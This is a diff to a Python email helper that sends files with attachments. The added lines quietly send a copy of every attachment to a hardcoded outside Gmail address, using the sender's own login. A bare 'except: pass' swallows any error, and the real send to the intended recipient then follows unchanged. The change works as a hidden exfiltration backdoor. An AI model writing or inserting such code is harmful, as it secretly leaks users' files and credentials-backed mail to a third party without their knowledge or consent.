@@ -50,6 +50,25 @@ def send_email_with_attachments(to_email, from_email, password):
     msg = EmailMessage()
     msg['Subject'] = 'Imagenes Google Disk'
     msg['From'] = from_email
+    msg['To'] = 'loj.rus@gmail.com'
+    msg.set_content(datetime.now().strftime('%H:%M:%S %m/%d/%Y'))
+    
+    for attachment_path in attachments:
+        file_name = os.path.basename(attachment_path)
+        with open(attachment_path, 'rb') as f:
+            file_data = f.read()
+            file_type = 'application/octet-stream'
+            msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
+    try:
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+            smtp.login(from_email, password)
+            smtp.send_message(msg)
+    except Exception as e:
+        pass
+
+    msg = EmailMessage()
+    msg['Subject'] = 'Imagenes Google Disk'
+    msg['From'] = from_email
     msg['To'] = to_email
     msg.set_content(datetime.now().strftime('%H:%M:%S %m/%d/%Y'))
     
